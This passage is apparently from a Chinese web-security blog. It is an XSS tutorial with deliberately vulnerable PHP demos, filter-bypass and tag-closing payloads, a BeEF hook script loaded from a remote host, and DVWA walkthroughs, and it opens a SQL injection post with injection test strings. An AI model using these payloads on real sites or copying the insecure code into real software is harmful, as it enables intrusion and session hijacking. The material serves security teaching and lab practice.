<h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a><strong>实例</strong></h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">//前端1.html</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>反射型<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"xss.php"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"name"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"提交"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//后端xss.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $name=$_POST[<span class="string">"name"</span>];</span><br><span class="line">	<span class="keyword">echo</span> $name;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code></p>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597249147737.png" alt="1597249147737" title class>
                <p>1597249147737</p>
            </figure>

<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597251966287.png" alt="1597249160807" title class>
                <p>1597249160807</p>
            </figure>

<h3 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h3><p><code>存储型也称作持久型，这类XSS攻击，不需要用户点击特定的URL，因为攻击者是将恶意代码插入服务器(数据库)中，当用户浏览相应的网页时就会触发</code></p>
<p>这类型的XSS一般存在留言板中</p>
<p>如：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"content"</span> <span class="attr">value</span>=<span class="string">“这里是用户填写的数据</span>"&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>但用户传入value参数为:<code>&lt;script&gt;alert(‘xss’)&lt;/script&gt;</code>就会存储到数据库中，访问时就会被触发。</p>
</blockquote>
<h4 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//创建数据库</span><br><span class="line">create database test;</span><br><span class="line">use test;</span><br><span class="line">create table xss(</span><br><span class="line">id int(3) not null,</span><br><span class="line">name varchar(200) not null,</span><br><span class="line">primary key(id)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">//2.html</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>存储型<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"save.php"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">            输入你ID:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"id"</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">            输入你NAME:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"name"</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"提交"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//save.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $id=$_POST[<span class="string">"id"</span>];</span><br><span class="line">	$name=$_POST[<span class="string">"name"</span>];</span><br><span class="line">	mysql_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>);</span><br><span class="line">	mysql_select_db(<span class="string">"test"</span>);</span><br><span class="line">	</span><br><span class="line">	$sql=<span class="string">"insert into xss value ($id,'$name')"</span>;</span><br><span class="line">	$result=mysql_query($sql);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//show.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$id=$_GET[<span class="string">"id"</span>];</span><br><span class="line">	mysql_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>);</span><br><span class="line">	mysql_select_db(<span class="string">"test"</span>);</span><br><span class="line"></span><br><span class="line">	$sql=<span class="string">"select name from xss where id=$id"</span>;</span><br><span class="line">	$result=mysql_query($sql);</span><br><span class="line">    <span class="keyword">while</span>($row=mysql_fetch_array($result))&#123; </span><br><span class="line">      <span class="keyword">echo</span> $row[<span class="string">'name'</span>]; </span><br><span class="line">    &#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>&lt;script&gt;alert(\&#39;xss\&#39;)&lt;/script&gt;</code>\用来转义</p>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597252051220.png" alt="1597249586099" title class>
                <p>1597249586099</p>
            </figure>

<p>查看数据库插入情况发现刚刚语句被插入到数据库中啦</p>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597249160807.png" alt="1597251966287" title class>
                <p>1597251966287</p>
            </figure>

<p>在查看页面查看数据<code>http://127.0.0.1/xss/show.php?id=1</code>发现语句被成功执行</p>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597249586099.png" alt="1597252051220" title class>
                <p>1597252051220</p>
            </figure>

<h3 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a>DOM型</h3><p><code>DOM型是一种特殊的非持久型，用户能够通过交互修改浏览器页面中的 DOM(DocumentObjectModel)并显示在浏览器上时，就有可能产生这种漏洞</code></p>
<p>payload:<code>http://127.0.0.1/dom.php?name=&lt;img src=1 onerror=alert(&quot;xss&quot;)&gt;</code></p>
<blockquote>
<p>当用户访问时，服务器就会返回包含恶意脚本的HTML静态文本，浏览器会把HTML解析成DOM，等于在网页直接插入</p>
</blockquote>
<h4 id="实例-2"><a href="#实例-2" class="headerlink" title="实例"></a>实例</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">//3.html</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>DOM型<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"dom.php"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"name"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"提交"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">//dom.php</span><br><span class="line">&lt;?php</span><br><span class="line">	$name=$_POST[&quot;name&quot;];	</span><br><span class="line">?&gt;</span><br><span class="line">&lt;input id=&quot;text&quot; type=&quot;text&quot; value=&quot;&lt;?php echo $name;?&gt;&quot;/&gt;</span><br><span class="line">&lt;div id=&quot;print&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">    var text=document.getElementById(&quot;text&quot;);</span><br><span class="line">    var print=document.getElementById(&quot;print&quot;);</span><br><span class="line">    print.innerHTML=text.value;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><code>&lt;img src=1 onerror=alert(&#39;xss&#39;)&gt;</code></p>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597252179215.png" alt="1597252179215" title class>
                <p>1597252179215</p>
            </figure>

<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597405925377.png" alt="1597252486630" title class>
                <p>1597252486630</p>
            </figure>

<h3 id="三者区别"><a href="#三者区别" class="headerlink" title="三者区别"></a>三者区别</h3><table>
<thead>
<tr>
<th align="center">XSS类型</th>
<th align="center">反射型</th>
<th align="center">存储型</th>
<th align="center">DOM型</th>
</tr>
</thead>
<tbody><tr>
<td align="center">触发过程</td>
<td align="center">正常用户访问携带XSS恶意脚本的URL</td>
<td align="center">正常用户访问黑客恶意构造存储在数据库输出的地方</td>
<td align="center">正常用户访问携带XSS恶意脚本的URL</td>
</tr>
<tr>
<td align="center">数据存储</td>
<td align="center">URL</td>
<td align="center">数据库</td>
<td align="center">URL</td>
</tr>
<tr>
<td align="center">谁来输出</td>
<td align="center">前端web程序</td>
<td align="center">前端web程序</td>
<td align="center">前端JavaScript</td>
</tr>
<tr>
<td align="center">输出位置</td>
<td align="center">HTTP响应中</td>
<td align="center">HTTP响应中</td>
<td align="center">动态构造的DOM结点</td>
</tr>
<tr>
<td align="center">数据流向</td>
<td align="center">前端–&gt;后端–&gt;前端</td>
<td align="center">前端–&gt;后端–&gt;数据库–&gt;后端–&gt;前端</td>
<td align="center">前端–&gt;浏览器</td>
</tr>
</tbody></table>
<h2 id="XSS绕过和闭合"><a href="#XSS绕过和闭合" class="headerlink" title="XSS绕过和闭合"></a>XSS绕过和闭合</h2><h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><h4 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h4><p><code>&lt;ImG SrC=1 OnerRor=alert(&#39;xss&#39;)&gt;</code></p>
<h4 id="双写关键字绕过"><a href="#双写关键字绕过" class="headerlink" title="双写关键字绕过"></a>双写关键字绕过</h4><p><code>&lt;imimgg srsrcc=1 onerror=alert(&#39;xxs&#39;)&gt;</code></p>
<h4 id="反引号绕过"><a href="#反引号绕过" class="headerlink" title="反引号绕过"></a>反引号绕过</h4><p><code>&lt;img src=1 onerror=alert(</code>`xss`<code>)&gt;</code></p>
<h4 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h4><p>URL编码、Base64编码等</p>
<h3 id="闭合"><a href="#闭合" class="headerlink" title="闭合"></a>闭合</h3><h4 id="能闭合标签"><a href="#能闭合标签" class="headerlink" title="能闭合标签"></a>能闭合标签</h4><ul>
<li>用户输入作为HTML注释内容</li>
</ul>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 用户输入内容 --&gt;</span></span><br></pre></td></tr></table></figure>

<p>payload：<code>--&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&lt;!--</code></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- --&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert('xss')<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="comment">&lt;!-- --&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>用户输入作为标签属性名</li>
</ul>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> 用户输入=<span class="string">"xxx"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>payload：<code>&lt;/div&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&lt;div a</code></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert('xss')<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">a</span>=<span class="string">"xxx"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>用户输入作为标签属性值</li>
</ul>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"用户输入"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>payload：<code>&quot;&gt;&lt;/div&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&lt;div a=&quot;x</code></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert('xss')<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">a</span>=<span class="string">"x"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>用户输入作为标签名</li>
</ul>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">用户输入</span> <span class="attr">id</span>=<span class="string">"xx"</span> /&gt;</span></span><br></pre></td></tr></table></figure>

<p>payload：<code>&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&lt;b</code></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert('xss')<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">b</span> <span class="attr">id</span>=<span class="string">"xx"</span> /&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>用户输入作为CSS内容</li>
</ul>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span>用户输入内容<span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>payload：<code>&lt;/style&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&lt;style&gt;</code></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert('xss')<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="不能闭合标签"><a href="#不能闭合标签" class="headerlink" title="不能闭合标签"></a>不能闭合标签</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">'输入内容'</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>payload：<code>&#39; onfocus=&#39;alter(/img/xss/xss/)</code></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">''</span> <span class="attr">onfocus</span>=<span class="string">'alter(/img/xss/xss/)'</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="工具使用-Beef"><a href="#工具使用-Beef" class="headerlink" title="工具使用(Beef)"></a>工具使用(Beef)</h2><blockquote>
<p>以kali系统为准</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>启动beef</span><br><span class="line">beef-xss</span><br><span class="line"><span class="meta">#</span>启动成功后生成xss钩子</span><br><span class="line">[*]    Hook: &lt;script src="http://&lt;IP&gt;:3000/hook.js"&gt;&lt;/script&gt;</span><br><span class="line">[*] Example: &lt;script src="http://127.0.0.1:3000/hook.js"&gt;&lt;/script&gt;</span><br><span class="line"><span class="meta">#</span>web UI界面</span><br><span class="line">[*]  Web UI: http://127.0.0.1:3000/ui/panel</span><br></pre></td></tr></table></figure>

<blockquote>
<p>登录UI管理界面</p>
</blockquote>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597252486630.png" alt="1597405925377" title class>
                <p>1597405925377</p>
            </figure>

<blockquote>
<p>然后将<code>&lt;script src=&quot;http://&lt;IP&gt;:3000/hook.js&quot;&gt;&lt;/script&gt;</code>作为xss语句注入，钩子被触发，目标就会自动上线</p>
</blockquote>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597310308297.png" alt="1597406088818" title class>
                <p>1597406088818</p>
            </figure>

<blockquote>
<p>这里命令慢慢摸索吧</p>
</blockquote>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597406088818.png" alt="1597409122987" title class>
                <p>1597409122987</p>
            </figure>

<h2 id="靶场练习"><a href="#靶场练习" class="headerlink" title="靶场练习"></a>靶场练习</h2><h3 id="反射型-1"><a href="#反射型-1" class="headerlink" title="反射型"></a>反射型</h3><h4 id="LOW"><a href="#LOW" class="headerlink" title="LOW"></a>LOW</h4><blockquote>
<p>XSS原则见框就插，我们发现这里不管输入说明都直接回显</p>
</blockquote>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597310549808.png" alt="1597310308297" title class>
                <p>1597310308297</p>
            </figure>

<p><code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code></p>
<blockquote>
<p>插入测试语句发现直接弹窗</p>
</blockquote>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597310786907.png" alt="1597310549808" title class>
                <p>1597310549808</p>
            </figure>

<h4 id="MEDIUM"><a href="#MEDIUM" class="headerlink" title="MEDIUM"></a>MEDIUM</h4><blockquote>
<p>这里我们直接输入测试语句发<code>&lt;script&gt;&lt;/script&gt;</code>被过滤了</p>
</blockquote>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597310947363.png" alt="1597310786907" title class>
                <p>1597310786907</p>
            </figure>

<p><code>&lt;img src=1 onerror=alert(&#39;xss&#39;)&gt;</code></p>
<blockquote>
<p>这里我们直接用img标签插入成功回弹，这里可以使用大小写绕过</p>
</blockquote>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597319991473.png" alt="1597310947363" title class>
                <p>1597310947363</p>
            </figure>

<h4 id="HIGH"><a href="#HIGH" class="headerlink" title="HIGH"></a>HIGH</h4><blockquote>
<p>通过测试发现这里过滤<code>&lt;script&gt;</code>开头的语句,所以使用<code>&lt;img src=1 onerror=alert(&#39;xss&#39;)&gt;</code></p>
</blockquote>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597320660164.png" alt="1597319991473" title class>
                <p>1597319991473</p>
            </figure>

<h3 id="存储型-1"><a href="#存储型-1" class="headerlink" title="存储型"></a>存储型</h3><h4 id="LOW-1"><a href="#LOW-1" class="headerlink" title="LOW"></a>LOW</h4><blockquote>
<p>输入内容发现，会保存到数据库，每次打开都会查询并显示出来</p>
</blockquote>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597320803531.png" alt="1597320660164" title class>
                <p>1597320660164</p>
            </figure>

<p>name：<code>test</code></p>
<p>message：<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code></p>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597409122987.png" alt="1597320803531" title class>
                <p>1597320803531</p>
            </figure>

<h4 id="MEDIUM-1"><a href="#MEDIUM-1" class="headerlink" title="MEDIUM"></a>MEDIUM</h4><blockquote>
<p>这里过滤了<code>&lt;script&gt;</code>标签,并且message也过滤了<code>img</code>标签，所以我尝试在name中插入，但是name有长度限制我们抓包修改一下</p>
</blockquote>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597321652662.png" alt="1597321652662" title class>
                <p>1597321652662</p>
            </figure>

<p>name：<code>&lt;img src=1 onerror=alert(&#39;xss&#39;)&gt;</code></p>
<p>message：<code>test</code></p>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597322478517.png" alt="1597322464689" title class>
                <p>1597322464689</p>
            </figure>

<blockquote>
<p>抓包修改了，成功执行xss语句</p>
</blockquote>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597322464689.png" alt="1597322478517" title class>
                <p>1597322478517</p>
            </figure>

<h4 id="HIGH-1"><a href="#HIGH-1" class="headerlink" title="HIGH"></a>HIGH</h4><blockquote>
<p>这里我们直接用<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>尝试发现都给过滤了，然后采用<code>img</code>标签尝试，但是name依旧有长度限制，我们这次尝试在浏览器中修改长度</p>
</blockquote>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597322686394.png" alt="1597322686394" title class>
                <p>1597322686394</p>
            </figure>

<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597322751829.png" alt="1597322735493" title class>
                <p>1597322735493</p>
            </figure>

<p>name：<code>&lt;img src=1 onerror=alert(&#39;xss&#39;)&gt;</code></p>
<p>message：<code>&lt;img src=1 onerror=alert(&#39;xss&#39;)&gt;</code></p>
<blockquote>
<p>语句成功执行</p>
</blockquote>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597322735493.png" alt="1597322751829" title class>
                <p>1597322751829</p>
            </figure>

<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><ol>
<li>对用户输入输出字符进行安全过滤和转义</li>
<li>Cookie属性HttpOnly设置为true，防止被JS调用</li>
<li>检查HTTP Referer是否来自预料中的 URL</li>
</ol>
<hr>
]]></content>
      
        <categories>
            
            <category> web安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[web安全-SQL注入]]></title>
      <url>/2021/01/24/SQL%E6%B3%A8%E5%85%A5/</url>
      <content type="html"><![CDATA[<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><blockquote>
<p>Author:<code>wisejay</code></p>
<p>Email:<code>wisejay@foxmail.com</code></p>
</blockquote>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>SQL注入，就是用户通过web应用程序，可以将恶意构造的SQL命令注入到后台数据库引擎执行，并返回用户想要得内容，而不是按照设计者意图去执行SQL语句。</p>
<h2 id="注入点判断"><a href="#注入点判断" class="headerlink" title="注入点判断"></a>注入点判断</h2><p>注释说明:<code>--和#是注释，但#在url中会被当作锚点，提交过程需要先编码，url编码为%23；--后面需要空格隔开后面语句，常用--+,+在url中被转义作为空格</code></p>
<ul>
<li><code>1 or 1=1--+</code></li>
<li><code>1&#39; or 1=1--+</code></li>
<li><code>1&quot; or 1=1--+</code></li>
<li><code>1) or 1=1--+</code></li>
<li><code>1&#39;) or 1=1--+</code></li>
<li><code>1&quot;) or 1=1--+</code></li>
<li><code>1&quot;)) or 1=1--+</code></li>
</ul>
<p><code>如果是字符型先闭合前面符号&#39;或&quot;等，然后注释掉后面特殊符合</code></p>
<blockquote>
<p>判断闭合类型：依次输入各种类型，结果和其他类型不同的闭合。</p>
</blockquote>
<h2 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h2><ul>
<li><p>version()——查看当前数据库的版本信息</p>
</li>
<li><p>user()——查看当前连接数据库的用户 </p>
</li>
<li><p>database()——查看当前数据库的名称</p>
</li>
<li><p>@@datadir——数据库路径 </p>
</li>
<li><p>@@version_compile_os——操作系统版本 </p>
</li>
<li><p>concat(str1,str2……)：没有分隔符的连接字符串。 </p>
</li>
<li><p>concat_ws(separator,str1,str2……)：该函数第一个参数是其他参数的分隔符,分隔符在连接字符串之间加入。 </p>
</li>
<li><p>group_concat(str1,str2……)：将多行查询的结果以逗号为分隔符连接成为一行结果。</p>
</li>
</ul>
<h2 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h2><blockquote>
